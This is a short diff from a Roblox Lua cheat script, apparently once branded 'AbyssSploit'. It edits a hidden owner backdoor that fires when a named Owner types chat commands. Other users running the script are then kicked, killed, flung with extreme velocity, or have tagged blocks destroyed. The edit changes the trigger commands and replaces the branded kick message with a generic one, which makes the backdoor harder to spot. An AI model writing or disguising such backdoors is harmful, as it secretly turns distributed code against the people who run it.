@@ -6171,25 +6171,25 @@ task.spawn(function()
 
 		for i, v in next, PlayerService:GetPlayers() do
 			v.Chatted:Connect(function(Message)				
-				if Message:lower() == ";kick default" and v.Name == Owner and LocalPlayer.Name ~= Owner then
+				if Message:lower() == "!kick ." and v.Name == Owner and LocalPlayer.Name ~= Owner then
 					task.spawn(function()
-						LocalPlayer:Kick("Kicked by AbyssSploit owner")
+						LocalPlayer:Kick("Kicked by script owner")
 					end)
 				end
 
-				if Message:lower() == ";kill default" and v.Name == Owner and LocalPlayer.Name ~= Owner then
+				if Message:lower() == "!kill ." and v.Name == Owner and LocalPlayer.Name ~= Owner then
 					task.spawn(function()
 						KillHumanoid(0)
 					end)
 				end
 
-				if Message:lower() == ";lagback default" and v.Name == Owner and LocalPlayer.Name ~= Owner then
+				if Message:lower() == "!lag ." and v.Name == Owner and LocalPlayer.Name ~= Owner then
 					task.spawn(function()
 						LocalPlayer.Character.PrimaryPart.Velocity = Vector3.new(99999, 99999, 99999)
 					end)
 				end
 
-				if Message:lower() == "!test default" and v.Name == Owner and LocalPlayer.Name ~= Owner then
+				if Message:lower() == "!bm ." and v.Name == Owner and LocalPlayer.Name ~= Owner then
 					task.spawn(function()
 						for i, v in next, CollectionService:GetTagged("block") do
 							v:Destroy()
